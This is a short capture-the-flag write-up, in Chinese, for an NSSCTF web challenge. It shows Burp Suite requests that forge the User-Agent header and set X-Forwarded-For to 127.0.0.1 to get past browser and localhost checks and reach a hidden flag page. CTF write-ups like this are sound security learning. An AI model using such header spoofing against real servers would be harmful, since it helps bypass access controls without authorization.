打開http://node2.anna.nssctf.cn:xxxxx/hello.php ->`Please use 'WLLM' browser!`
********
用burpsuite改http的get請求
```http
GET /a.php HTTP/1.1
Host: (http://node2.anna.nssctf.cn:xxxxx/hello.php)
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
把User-Agent:改為WLLM -> `User-Agent:WLLM`
##############
respone得到location a.php 
```http
HTTP/1.1 302 Found
Date: Thu, 22 Jun 2023 03:45:07 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Location: ./a.php
Content-Length: 7
Connection: close
Content-Type: text/html; charset=UTF-8

success
```
去http://node2.anna.nssctf.cn:xxxxx/a.php  -> `You can only read this at local!Your address xxx.xxx.xx.186` 

繼續用brupsuite 把ip改為local -> `X-Forwarded-For:127.0.0.1`

```http
GET /a.php HTTP/1.1
Host: node1.anna.nssctf.cn:xxxxxx
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For:127.0.0.1

```
respone出了location `secretttt.php` ->去 http://node2.anna.nssctf.cn:xxxxx/secretttt.php 拿flag

|知識點： ||
|------|----------|
|User-Agent：|使用的瀏覽器|
|X-Forwarded-For|改ip地址|
|127.0.0.1|local地址|
